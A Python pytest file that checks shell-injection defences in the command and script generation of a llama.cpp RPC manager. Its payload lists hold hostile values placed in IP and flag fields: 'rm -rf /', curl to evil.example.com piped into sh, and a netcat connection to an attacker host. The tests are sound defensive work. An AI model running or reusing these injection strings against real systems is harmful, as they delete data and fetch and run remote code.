"""Shell-injection tests for llama.cpp command rendering.

The qe-validation section below pins that attacker-controlled IPs and
flag values cannot break out of the generated RPC/launch shell commands.
"""
import re
import shlex

import pytest

import rpc_manager
from rpc_manager import build_llama_command, _render_rpc


# ======================================================================
# qe-validation-test branch: secrets-vault / installer regression tests
# (helper names prefixed _qe_)
# ======================================================================

import re
import shlex

import pytest

import rpc_manager
from rpc_manager import build_llama_command, _render_rpc


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------

def _machine(name, ip, os="linux", role="peer", **kw):
    m = {
        "name": name,
        "ip": ip,
        "username": "u",
        "password": "p",
        "os": os,
        "rpc_port": 50052,
        "gpu": "CUDA0",
        "role": role,
        "detected": {
            "gpu_names": ["CUDA0 (GPU)"],
            "vram_total_gb": 8,
            "ram_total_gb": 16,
            "cores": 8,
        },
    }
    m.update(kw)
    return m


def _qe__model(mid, flags=None, base_path="store://llm-models/safe.gguf", **kw):
    m = {
        "model_id": mid,
        "flags": flags or {},
        "base_path": base_path,
        "device_order": "",
        "device_order_policy": "as-selected",
        "expose": {},
    }
    m.update(kw)
    return m


# Metacharacter payloads that must never appear unquoted in generated scripts.
_PAYLOADS = [
    "10.0.0.1; rm -rf /",
    "10.0.0.1`id`",
    "10.0.0.1$(curl evil.example.com)",
    "10.0.0.1 | nc attacker 4444",
]


def _unquoted_payload_present(script: str, raw_payload: str) -> bool:
    """Return True if *raw_payload* (or any dangerous metacharacter substring
    of it beyond the plain IP) appears outside of a single- or double-quoted
    context in *script*.

    Strategy: look for the metacharacter sequence that follows the IP address.
    If the injected suffix (e.g. ``; rm -rf /``) appears in the script at all
    outside of a quoted string, it is potentially executable.
    """
    # Extract the injected suffix after the IP (everything after the first space
    # or shell metacharacter boundary).
    suffix_match = re.search(r'[\d\.]+(.+)', raw_payload)
    if not suffix_match:
        return False
    suffix = re.escape(suffix_match.group(1).strip())
    # Accept if it only appears inside single-quoted strings ('...')
    # or double-quoted strings ("..."), which neutralise most metacharacters.
    for line in script.splitlines():
        if re.search(suffix, line):
            # Check whether the occurrence is inside quotes.
            # Simple heuristic: if the line has the suffix but it is not
            # wrapped in quotes, flag it.
            if not re.search(r"'[^']*" + suffix + r"[^']*'", line) and \
               not re.search(r'"[^"]*' + suffix + r'[^"]*"', line):
                return True
    return False


# ---------------------------------------------------------------------------
# build_llama_command: injected IP in --rpc flag
# ---------------------------------------------------------------------------

@pytest.mark.parametrize("malicious_ip", _PAYLOADS)
def test_build_command_rpc_ip_does_not_inject(stub_cfg, malicious_ip):
    """A malicious IP for a peer must not produce an unquoted shell
    metacharacter in the llama-server command line emitted by
    build_llama_command."""
    master = _machine("aibox1", "10.0.0.98", role="master")
    peer = _machine("aibox2", malicious_ip, role="peer")
    stub_cfg.update({m["name"]: m for m in (master, peer)})
    model = _qe__model("m")

    # The function must either raise a ValueError/sanitization error OR
    # produce output where the metacharacter suffix is safely quoted.
    try:
        cmd = build_llama_command(
            model, [master["name"], peer["name"]], master_name=master["name"]
        )
    except (ValueError, KeyError):
        # Rejection at generation time is an acceptable safe outcome.
        return

    assert not _unquoted_payload_present(cmd, malicious_ip), (
        f"Metacharacter payload appeared unquoted in generated command:\n"
        f"payload={malicious_ip!r}\ncmd=\n{cmd}"
    )


# ---------------------------------------------------------------------------
# build_llama_command: injected value in a user-supplied flag
# ---------------------------------------------------------------------------

@pytest.mark.parametrize("malicious_flag_value", [
    "8192; echo pwned",
    "8192`id`",
    "8192 && curl evil.example.com | sh",
])
def test_build_command_flag_value_does_not_inject(stub_cfg, malicious_flag_value):
    """A user-supplied flag value containing shell metacharacters must not
    appear unquoted in the generated llama-server command."""
    master = _machine("aibox1", "10.0.0.98", role="master")
    stub_cfg.update({master["name"]: master})
    model = _qe__model("m", flags={"ctx-size": malicious_flag_value})

    try:
        cmd = build_llama_command(
            model, [master["name"]], master_name=master["name"]
        )
    except (ValueError, KeyError):
        return  # Rejected — safe.

    # The semicolon / backtick / && must not appear unquoted.
    dangerous = re.compile(r'(?:;|`|&&|\|\|)')
    for line in cmd.splitlines():
        # Strip anything inside single or double quotes before checking.
        stripped = re.sub(r"'[^']*'", "", line)
        stripped = re.sub(r'"[^"]*"', "", stripped)
        assert not dangerous.search(stripped), (
            f"Unquoted metacharacter in flag line:\n{line!r}\n"
            f"flag_value={malicious_flag_value!r}"
        )


# ---------------------------------------------------------------------------
# _render_rpc: injected IP in the start-* script
# ---------------------------------------------------------------------------

@pytest.mark.parametrize("malicious_ip", _PAYLOADS)
def test_render_rpc_ip_does_not_inject(stub_cfg, malicious_ip):
    """A malicious peer IP must not produce an unquoted shell metacharacter
    in the _render_rpc bash start script."""
    master = _machine("aibox1", "10.0.0.98", role="master")
    peer = _machine("aibox2", malicious_ip)
    stub_cfg.update({m["name"]: m for m in (master, peer)})
    model = _qe__model(
        "m",
        device_order=f"aibox1-CUDA0,aibox2-CUDA0",
    )

    try:
        script = _render_rpc(model, master, [peer])
    except (ValueError, KeyError):
        return  # Rejected — safe.

    assert not _unquoted_payload_present(script, malicious_ip), (
        f"Metacharacter payload appeared unquoted in RPC script:\n"
        f"payload={malicious_ip!r}\nscript=\n{script}"
    )
